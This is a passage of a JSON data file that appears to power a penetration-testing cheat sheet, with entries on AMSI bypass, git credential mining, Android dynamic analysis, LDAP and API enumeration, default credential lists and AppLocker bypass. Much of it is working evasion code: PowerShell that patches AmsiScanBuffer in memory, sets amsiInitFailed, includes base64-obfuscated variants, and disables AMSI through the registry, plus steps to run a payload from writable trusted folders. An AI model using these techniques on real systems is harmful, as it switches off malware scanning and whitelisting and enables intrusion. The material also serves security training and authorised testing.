            "codes": [
              {
                "lang": "powershell",
                "code": "$a = [Ref].Assembly.GetTypes() | ForEach-Object { if ($_.Name -like \"*iUtils\") { $_ } }\n$b = $a.GetFields('NonPublic,Static') | ForEach-Object { if ($_.Name -like \"*Context\") { $_ } }\n$c = $b.GetValue($null)\n[IntPtr]$ptr = $c\n[Int32[]]$buf = @(0)\n[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false,
            "notes": [
              {
                "type": "note",
                "content": "Corrupt AMSI context to make scans fail.",
                "variant": "tip"
              }
            ]
          },
          {
            "title": "Attacking Initialization",
            "codes": [
              {
                "lang": "powershell",
                "code": "$a = [Ref].Assembly.GetTypes() | Where-Object { $_.Name -like \"*iUtils\" }\n$b = $a.GetFields('NonPublic,Static') | Where-Object { $_.Name -like \"*InitFailed\" }\n$b.SetValue($null, $true)"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false,
            "notes": [
              {
                "type": "note",
                "content": "Set **amsiInitFailed** to true so AMSI never initializes.",
                "variant": "tip"
              }
            ]
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Patching AMSI in PowerShell",
        "substeps": [
          {
            "title": "AmsiScanBuffer Patch",
            "codes": [
              {
                "lang": "powershell",
                "code": "$Win32 = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n    [DllImport(\"kernel32\")]\n    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);\n    [DllImport(\"kernel32\")]\n    public static extern IntPtr LoadLibrary(string name);\n    [DllImport(\"kernel32\")]\n    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);\n}\n\"@\n\nAdd-Type $Win32\n\n$LoadLibrary = [Win32]::LoadLibrary(\"amsi.dll\")\n$Address = [Win32]::GetProcAddress($LoadLibrary, \"AmsiScanBuffer\")\n$p = 0\n[Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p)\n$Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)\n[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 6)"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false,
            "notes": [
              {
                "type": "note",
                "content": "Overwrite **AmsiScanBuffer** to always return clean result.",
                "variant": "danger"
              }
            ]
          },
          {
            "title": "One-Liner AMSI Bypass",
            "codes": [
              {
                "lang": "powershell",
                "code": "[Ref].Assembly.GetType('System.Management.Automation.'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQBVAHQAaQBsAHMA')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),'NonPublic,Static').SetValue($null,$true)"
              }
            ],
            "optional": false,
            "alternative": true,
            "remote": false,
            "local": false
          },
          {
            "title": "Matt Graeber's Bypass",
            "codes": [
              {
                "lang": "powershell",
                "code": "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Bypassing AMSI in JScript",
        "substeps": [
          {
            "title": "Registry Key Method",
            "codes": [
              {
                "lang": "bash",
                "code": "reg add \"HKCU\\Software\\Microsoft\\Windows Script\\Settings\" /v AmsiEnable /t REG_DWORD /d 0 /f"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false,
            "notes": [
              {
                "type": "note",
                "content": "AMSI can be disabled via registry for WSH.",
                "variant": "tip"
              }
            ]
          },
          {
            "title": "WScript AMSI Bypass",
            "codes": [
              {
                "lang": "javascript",
                "code": "var sh = new ActiveXObject('WScript.Shell');\nsh.RegWrite('HKCU\\\\Software\\\\Microsoft\\\\Windows Script\\\\Settings\\\\AmsiEnable', 0, 'REG_DWORD');\n// Now execute payload"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false,
            "notes": [
              {
                "type": "note",
                "content": "COM object instantiation before AMSI initialization.",
                "variant": "tip"
              }
            ]
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Obfuscating AMSI Bypasses",
        "substeps": [
          {
            "title": "String Concatenation",
            "codes": [
              {
                "lang": "powershell",
                "code": "$a = \"Sy\" + \"stem.Man\" + \"agement.Auto\" + \"mation.Am\" + \"siUt\" + \"ils\"\n$b = \"am\" + \"siIn\" + \"itFa\" + \"iled\"\n[Ref].Assembly.GetType($a).GetField($b,'NonPublic,Static').SetValue($null,$true)"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Base64 Encoding",
            "codes": [
              {
                "lang": "powershell",
                "code": "$encoded = \"U3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5BbXNpVXRpbHM=\"\n$type = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($encoded))"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [
      {
        "text": "Microsoft AMSI Documentation",
        "url": "https://learn.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-portal"
      }
    ],
    "advanced": true,
    "notes": [
      {
        "type": "note",
        "content": "Antimalware Scan Interface (**AMSI**) allows applications to request malware scans. PowerShell, JScript, VBScript send content to AMSI before execution.",
        "variant": "info"
      }
    ]
  },
  {
    "category": "GitHub Reconnaissance",
    "title": "Analyzing Git Repository",
    "tags": [],
    "steps": [
      {
        "title": "View Commit History",
        "codes": [
          {
            "lang": "bash",
            "code": "cd git-dump\ngit log"
          },
          {
            "lang": "bash",
            "code": "# Detailed log with file changes\ngit log --stat"
          },
          {
            "lang": "bash",
            "code": "# One-line format\ngit log --oneline"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Example Output",
        "codes": [
          {
            "lang": "plaintext",
            "code": "commit a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6q7r8s9t0\nAuthor: admin <admin@company.com>\nDate:   Mon Jan 15 10:30:00 2024 +0000\n\n    Added database credentials"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "View Specific Commit",
        "codes": [
          {
            "lang": "bash",
            "code": "git show <commit-id>"
          },
          {
            "lang": "bash",
            "code": "# Example\ngit show a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6q7r8s9t0"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "postNotes": [
          {
            "type": "note",
            "content": "This displays the commit information and newly added content.",
            "variant": "info"
          }
        ]
      },
      {
        "title": "Example Output",
        "codes": [
          {
            "lang": "diff",
            "code": "commit a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6q7r8s9t0\nAuthor: admin <admin@company.com>\nDate:   Mon Jan 15 10:30:00 2024 +0000\n\n    Added database credentials\n\ndiff --git a/config.php b/config.php\n+++ b/config.php\n@@ -1,3 +1,6 @@\n+$db_host = \"localhost\";\n+$db_user = \"admin\";\n+$db_pass = \"SuperSecretPassword123!\";"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Search Commit Messages",
        "codes": [
          {
            "lang": "bash",
            "code": "# Search for specific keywords\ngit log --grep=\"password\"\ngit log --grep=\"credential\"\ngit log --grep=\"secret\"\ngit log --grep=\"api\"\ngit log --grep=\"key\""
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "View All Branches",
        "codes": [
          {
            "lang": "bash",
            "code": "git branch -a"
          },
          {
            "lang": "bash",
            "code": "# Checkout different branch\ngit checkout <branch-name>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "View File at Specific Commit",
        "codes": [
          {
            "lang": "bash",
            "code": "git show <commit-id>:<file-path>"
          },
          {
            "lang": "bash",
            "code": "# Example\ngit show a1b2c3d4:config.php"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": []
  },
  {
    "category": "Android Pentesting",
    "title": "Android Dynamic Analysis",
    "tags": [
      "Exploitation",
      "Mobile"
    ],
    "steps": [
      {
        "title": "Proxy Traffic with Burp",
        "codes": [
          {
            "lang": "bash",
            "code": "adb push burp-cert.der /sdcard/"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Configure device proxy and install Burp CA certificate:\n1. On device: Settings > WiFi > Proxy > Manual\n2. Host: AttackerIP, Port: 8080\n3. Install via Settings > Security > Install Certificate",
            "variant": "info"
          }
        ]
      },
      {
        "title": "Frida Server Setup",
        "codes": [
          {
            "lang": "bash",
            "code": "adb push frida-server /data/local/tmp/\nadb shell chmod 755 /data/local/tmp/frida-server\nadb shell /data/local/tmp/frida-server &\n\n# Verify\nfrida-ps -U"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "SSL Pinning Bypass with Objection",
        "codes": [
          {
            "lang": "bash",
            "code": "objection -g <PackageName> explore\n> android sslpinning disable"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Check Data Storage",
        "codes": [
          {
            "lang": "bash",
            "code": "adb shell\nrun-as <PackageName>\n\n# Shared preferences\ncat /data/data/<PackageName>/shared_prefs/*.xml\n\n# SQLite databases\nsqlite3 /data/data/<PackageName>/databases/<db>.db\n> .tables\n> SELECT * FROM <Table>;"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Test Exported Components",
        "codes": [
          {
            "lang": "bash",
            "code": "# Launch exported activity\nadb shell am start -n <PackageName>/<ActivityName>\n\n# Send broadcast\nadb shell am broadcast -a <ActionName> -n <PackageName>/<ReceiverName>\n\n# Query content provider\nadb shell content query --uri content://<PackageName>.<Provider>/"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "MobSF (Automated)",
        "codes": [
          {
            "lang": "bash",
            "code": "docker run -it --rm -p 8000:8000 opensecurity/mobile-security-framework-mobsf\n# Upload APK to http://localhost:8000"
          }
        ],
        "optional": true,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Drozer",
        "codes": [
          {
            "lang": "bash",
            "code": "dz console connect\n> run app.package.attacksurface <PackageName>\n> run app.activity.info -a <PackageName>\n> run app.provider.query content://<URI>"
          }
        ],
        "optional": true,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [
      {
        "text": "Frida",
        "url": "https://frida.re/docs/android/"
      },
      {
        "text": "Objection",
        "url": "https://github.com/sensepost/objection"
      }
    ],
    "foundational": true,
    "notes": [
      {
        "type": "note",
        "content": "Runtime analysis with proxy interception and instrumentation."
      }
    ]
  },
  {
    "category": "LDAP Enumeration",
    "title": "Anonymous LDAP Bind",
    "tags": [
      "Active_Directory",
      "Enumeration",
      "LDAP"
    ],
    "steps": [
      {
        "title": "Test Anonymous Bind with ldapsearch",
        "codes": [
          {
            "lang": "bash",
            "code": "ldapsearch -x -H ldap://<DomainController> -b \"DC=corp,DC=local\""
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "postNotes": [
          {
            "type": "note",
            "content": "Flags:\n- `-x`: Simple authentication (no SASL)\n- `-H`: LDAP URI\n- `-b`: Base DN to search from",
            "variant": "info"
          }
        ]
      },
      {
        "title": "Enumerate All Users (Anonymous)",
        "codes": [
          {
            "lang": "bash",
            "code": "ldapsearch -x -H ldap://<DomainController> -b \"DC=corp,DC=local\" \"(objectClass=user)\" sAMAccountName userPrincipalName"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Enumerate All Computers (Anonymous)",
        "codes": [
          {
            "lang": "bash",
            "code": "ldapsearch -x -H ldap://<DomainController> -b \"DC=corp,DC=local\" \"(objectClass=computer)\" dNSHostName operatingSystem"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Enumerate All Groups (Anonymous)",
        "codes": [
          {
            "lang": "bash",
            "code": "ldapsearch -x -H ldap://<DomainController> -b \"DC=corp,DC=local\" \"(objectClass=group)\" cn member"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [],
    "foundational": true,
    "notes": [
      {
        "type": "note",
        "content": "Some domains allow anonymous LDAP queries without authentication.",
        "variant": "tip"
      }
    ]
  },
  {
    "category": "API Enumeration",
    "title": "API Enumeration",
    "tags": [
      "Discovery",
      "HTTP",
      "Reconnaissance",
      "Web_Application"
    ],
    "steps": [
      {
        "title": "Create Pattern File",
        "codes": [
          {
            "lang": "bash",
            "code": "echo '{GOBUSTER}/v1' > pattern\necho '{GOBUSTER}/v2' >> pattern"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Use **Gobuster** pattern feature to append version numbers to wordlist entries.",
            "variant": "tip"
          }
        ]
      },
      {
        "title": "Brute Force API Paths",
        "codes": [
          {
            "lang": "bash",
            "code": "gobuster dir -u http://<Target>:<Port> -w /usr/share/wordlists/dirb/big.txt -p pattern"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Enumerate API Endpoint",
        "codes": [
          {
            "lang": "bash",
            "code": "curl -i http://<Target>:<Port>/<APIPath>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Brute Force Sub-paths",
        "codes": [
          {
            "lang": "bash",
            "code": "gobuster dir -u http://<Target>:<Port>/<APIPath>/<Username>/ -w /usr/share/wordlists/dirb/small.txt"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "GET Request",
        "codes": [
          {
            "lang": "bash",
            "code": "curl -i http://<Target>:<Port>/<APIPath>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "POST Request with JSON",
        "codes": [
          {
            "lang": "bash",
            "code": "curl -d '{\"key\":\"value\"}' -H 'Content-Type: application/json' http://<Target>:<Port>/<APIPath>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "PUT Request",
        "codes": [
          {
            "lang": "bash",
            "code": "curl -X 'PUT' -d '{\"key\":\"value\"}' -H 'Content-Type: application/json' http://<Target>:<Port>/<APIPath>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Often used to update/replace values instead of creating (**POST**).",
            "variant": "info"
          }
        ]
      },
      {
        "title": "Include Authorization Token",
        "codes": [
          {
            "lang": "bash",
            "code": "curl -H 'Authorization: OAuth <Token>' http://<Target>:<Port>/<APIPath>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "User Enumeration",
        "codes": [
          {
            "lang": "bash",
            "code": "curl http://<Target>:<Port>/users/v1"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Query **/users** endpoint to list usernames and emails."
          }
        ]
      },
      {
        "title": "Registration with Admin Flag",
        "codes": [
          {
            "lang": "bash",
            "code": "curl -d '{\"username\":\"attacker\",\"password\":\"pass\",\"email\":\"a@b.com\",\"admin\":\"True\"}' -H 'Content-Type: application/json' http://<Target>:<Port>/users/v1/register"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Try adding **admin** parameter when registering new user.",
            "variant": "tip"
          }
        ]
      },
      {
        "title": "Login to Get JWT Token",
        "codes": [
          {
            "lang": "bash",
            "code": "curl -d '{\"username\":\"<Username>\",\"password\":\"<Password>\"}' -H 'Content-Type: application/json' http://<Target>:<Port>/users/v1/login"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Change User Password",
        "codes": [
          {
            "lang": "bash",
            "code": "curl -X 'PUT' -H 'Authorization: OAuth <Token>' -H 'Content-Type: application/json' -d '{\"password\":\"<NewPassword>\"}' http://<Target>:<Port>/users/v1/<Username>/password"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [
      {
        "text": "HackTricks - Web API Pentesting",
        "url": "https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/web-api-pentesting.html"
      }
    ],
    "foundational": true,
    "notes": [
      {
        "type": "note",
        "content": "REST APIs often follow pattern **/api_name/v1** or **/api_name/v2**. Brute force to discover endpoints, then probe with different HTTP methods.",
        "variant": "info"
      }
    ]
  },
  {
    "category": "Application Enumeration",
    "title": "Application Enumeration",
    "tags": [
      "Binary_Exploitation",
      "Debugging",
      "Exploitation",
      "Reverse_Engineering",
      "Windows"
    ],
    "steps": [
      {
        "title": "Identify Network Services",
        "codes": [
          {
            "lang": "bash",
            "code": "netstat -ano | findstr LISTENING"
          },
          {
            "lang": "powershell",
            "code": "Get-NetTCPConnection -State Listen | Select-Object LocalPort, OwningProcess"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Find listening ports and services."
          }
        ]
      },
      {
        "title": "Identify Process Details",
        "codes": [
          {
            "lang": "bash",
            "code": "tasklist /FI \"PID eq <PID>\" /V\nwmic process where \"ProcessId=<PID>\" get CommandLine,ExecutablePath"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Get information about target process."
          }
        ]
      },
      {
        "title": "List Loaded DLLs",
        "codes": [
          {
            "lang": "text",
            "code": "0:000> lm\n0:000> !dlls"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Identify modules loaded by target process."
          }
        ]
      },
      {
        "title": "Find Entry Points",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Identify how application receives input:\n- **Network sockets**: recv, recvfrom, WSARecv\n- **File I/O**: ReadFile, fread, fgets\n- **User input**: GetWindowText, scanf\n- **Registry**: RegQueryValueEx\n- **Environment**: GetEnvironmentVariable",
            "variant": "info"
          }
        ]
      },
      {
        "title": "Search for Dangerous Functions in IDA",
        "codes": [
          {
            "lang": "text",
            "code": "; In IDA: View -> Open Subviews -> Imports\n; Look for:\nstrcpy, strcat, sprintf, vsprintf\nmemcpy, memmove\ngets, scanf\nrecv, recvfrom, WSARecv\nReadFile, fread"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Find potentially vulnerable function calls."
          }
        ]
      },
      {
        "title": "Cross-Reference Dangerous Functions",
        "codes": [
          {
            "lang": "text",
            "code": "; In IDA, on import:\nPress X to see all cross-references\nDouble-click to navigate to call site\nAnalyze data flow to find user-controlled input"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Find where vulnerable functions are called."
          }
        ]
      },
      {
        "title": "Identify Protocol Structure",
        "codes": [
          {
            "lang": "text",
            "code": "1. Capture traffic with Wireshark\n2. Look for patterns (headers, lengths, delimiters)\n3. Identify text vs binary protocols\n4. Find authentication mechanisms"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Understand application's network protocol."
          }
        ]
      },
      {
        "title": "Dynamic Analysis Setup",
        "codes": [
          {
            "lang": "text",
            "code": "1. Install application in isolated VM\n2. Take snapshot before testing\n3. Configure debugger (WinDbg/x64dbg)\n4. Set up network capture\n5. Create Python client for interaction"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Prepare for runtime analysis."
          }
        ]
      },
      {
        "title": "Common Vulnerability Patterns [Knowledge]",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "What to look for during enumeration:\n- **Buffer overflows**: Fixed-size buffers with unbounded input\n- **Format strings**: User input passed to printf-family functions\n- **Integer overflows**: Size calculations before memory allocation\n- **Use-after-free**: Object lifetime management issues\n- **Race conditions**: TOCTOU (time-of-check-time-of-use)",
            "variant": "important"
          }
        ]
      },
      {
        "title": "Document Attack Surface",
        "codes": [
          {
            "lang": "text",
            "code": "| Port  | Protocol | Handler Function | Input Type  | Notes           |\n|-------|----------|------------------|-------------|-----------------|\n| 9999  | TCP      | sub_401000       | Binary      | Custom protocol |\n| 80    | HTTP     | sub_402000       | Text        | REST API        |"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Create inventory of potential entry points."
          }
        ]
      }
    ],
    "resources": [
      {
        "text": "Attack Surface Analysis",
        "url": "https://owasp.org/www-community/controls/Attack_Surface_Analysis_Cheat_Sheet"
      }
    ],
    "advanced": true,
    "notes": [
      {
        "type": "note",
        "content": "Identify potential attack vectors in target applications before vulnerability research."
      }
    ]
  },
  {
    "category": "AppLocker Fundamentals",
    "title": "Application Whitelisting Theory",
    "tags": [
      "AppLocker_Bypass",
      "Defense_Evasion",
      "Windows"
    ],
    "steps": [
      {
        "title": "AppLocker Rule Types",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "- **Executable Rules** - .exe and .com files\n- **Windows Installer Rules** - .msi and .msp files\n- **Script Rules** - .ps1, .bat, .cmd, .vbs, .js files\n- **Packaged App Rules** - Windows Store apps\n- **DLL Rules** - .dll and .ocx files (optional, performance impact)"
          }
        ]
      },
      {
        "title": "AppLocker Rule Conditions",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "- **Publisher** - Based on digital signature\n- **Path** - Based on file location\n- **File Hash** - Based on cryptographic hash"
          }
        ]
      },
      {
        "title": "Default AppLocker Rules",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Default rules that can be bypassed:\n- Allow Administrators to run anything\n- Allow Everyone to run from Program Files\n- Allow Everyone to run from Windows folder\n- Allow Everyone to run Windows Installer files",
            "variant": "important"
          }
        ]
      },
      {
        "title": "Check AppLocker Status",
        "codes": [
          {
            "lang": "powershell",
            "code": "Get-AppLockerPolicy -Effective | Select-Object -ExpandProperty RuleCollections"
          },
          {
            "lang": "powershell",
            "code": "Get-AppLockerPolicy -Effective -Xml | Out-File applocker.xml"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      },
      {
        "title": "AppLocker Event Logs",
        "codes": [
          {
            "lang": "powershell",
            "code": "Get-WinEvent -LogName \"Microsoft-Windows-AppLocker/EXE and DLL\"\nGet-WinEvent -LogName \"Microsoft-Windows-AppLocker/MSI and Script\""
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [
      {
        "text": "Microsoft AppLocker",
        "url": "https://learn.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/applocker-overview"
      }
    ],
    "advanced": true,
    "notes": [
      {
        "type": "note",
        "content": "Application whitelisting restricts which programs can run. Only approved applications are allowed to execute.",
        "variant": "info"
      }
    ]
  },
  {
    "category": "Default Credentials",
    "title": "Application-Specific Defaults",
    "tags": [],
    "steps": [
      {
        "title": "Web Applications",
        "substeps": [
          {
            "title": "Tomcat",
            "codes": [
              {
                "lang": "plaintext",
                "code": "tomcat:tomcat\nadmin:admin\ntomcat:s3cret\nadmin:s3cret\nboth:tomcat"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Jenkins",
            "codes": [
              {
                "lang": "plaintext",
                "code": "admin:admin\nadmin:password\njenkins:jenkins"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Grafana",
            "codes": [
              {
                "lang": "plaintext",
                "code": "admin:admin\nadmin:password"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Kibana",
            "codes": [
              {
                "lang": "plaintext",
                "code": "elastic:changeme\nkibana:kibana"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Databases",
        "substeps": [
          {
            "title": "MySQL/MariaDB",
            "codes": [
              {
                "lang": "plaintext",
                "code": "root:(blank)\nroot:root\nroot:password\nroot:toor\nmysql:mysql"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "PostgreSQL",
            "codes": [
              {
                "lang": "plaintext",
                "code": "postgres:(blank)\npostgres:postgres\npostgres:password"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "MSSQL",
            "codes": [
              {
                "lang": "plaintext",
                "code": "sa:(blank)\nsa:sa\nsa:password\nsa:Password123"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "MongoDB",
            "codes": [
              {
                "lang": "plaintext",
                "code": "admin:(blank)\nadmin:admin\nroot:(blank)"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Network Devices",
        "substeps": [
          {
            "title": "Cisco",
            "codes": [
              {
                "lang": "plaintext",
                "code": "admin:admin\ncisco:cisco\nadmin:cisco"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Juniper",
            "codes": [
              {
                "lang": "plaintext",
                "code": "root:(blank)\nadmin:admin\nnetscreen:netscreen"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "HP/3Com",
            "codes": [
              {
                "lang": "plaintext",
                "code": "admin:admin\nmanager:manager"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "IoT/Embedded Devices",
        "substeps": [
          {
            "title": "Raspberry Pi",
            "codes": [
              {
                "lang": "plaintext",
                "code": "pi:raspberry"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Arduino",
            "codes": [
              {
                "lang": "plaintext",
                "code": "arduino:arduino"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "IP Cameras",
            "codes": [
              {
                "lang": "plaintext",
                "code": "admin:admin\nadmin:12345\nadmin:(blank)\nroot:root\nroot:12345"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": []
  },
  {
    "category": "AppLocker Basic Bypasses",
    "title": "AppLocker Basic Bypasses",
    "tags": [
      "AppLocker_Bypass",
      "Defense_Evasion",
      "Windows"
    ],
    "steps": [
      {
        "title": "Trusted Folders Bypass",
        "substeps": [
          {
            "title": "Find Writable Directories",
            "codes": [
              {
                "lang": "powershell",
                "code": "# Check for writable folders in Program Files\nGet-ChildItem \"C:\\Program Files\" -Recurse -Directory | ForEach-Object {\n    $acl = Get-Acl $_.FullName\n    if ($acl.Access | Where-Object { $_.FileSystemRights -match \"Write\" -and $_.IdentityReference -match \"Users\" }) {\n        $_.FullName\n    }\n}"
              },
              {
                "lang": "bash",
                "code": "icacls \"C:\\Program Files\" /T /C 2>nul | findstr /i \"Users:(F) Users:(M) Users:(W) BUILTIN\\Users:(F) BUILTIN\\Users:(M) BUILTIN\\Users:(W)\""
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": true,
            "local": false
          },
          {
            "title": "Common Writable Locations",
            "codes": [],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false,
            "notes": [
              {
                "type": "note",
                "content": "Common writable paths:\n- **C:\\Windows\\Tasks** - Often writable\n- **C:\\Windows\\Temp** - Usually writable\n- **C:\\Windows\\tracing** - Sometimes writable\n- **C:\\Windows\\System32\\spool\\drivers\\color** - Often writable",
                "variant": "tip"
              }
            ]
          },
          {
            "title": "Copy and Execute from Trusted Path",
            "codes": [
              {
                "lang": "bash",
                "code": "copy payload.exe C:\\Windows\\Tasks\\\nC:\\Windows\\Tasks\\payload.exe"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": true,
            "local": false
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "DLL Bypass",
        "substeps": [
          {
            "title": "Check if DLL Rules Active",
            "codes": [
              {
                "lang": "powershell",
                "code": "Get-AppLockerPolicy -Effective | Select-Object -ExpandProperty RuleCollections | Where-Object { $_.RuleCollectionType -eq \"Dll\" }"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": true,
            "local": false
          },
          {
